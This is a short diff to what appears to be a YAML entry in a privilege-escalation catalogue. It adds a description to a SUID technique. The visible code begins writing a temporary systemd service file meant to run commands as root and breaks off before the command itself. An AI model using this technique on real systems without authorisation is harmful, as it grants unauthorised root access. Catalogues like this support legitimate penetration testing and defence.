@@ -1,7 +1,8 @@
 ---
 functions:
   suid:
-    - code: |
+    - description: Runs the code under ExecStart. By default it will save 'root' into /tmp/output. You probably want to change this line.
+      code: |
         TF=$(mktemp).service
         echo '[Service]
         Type=oneshot
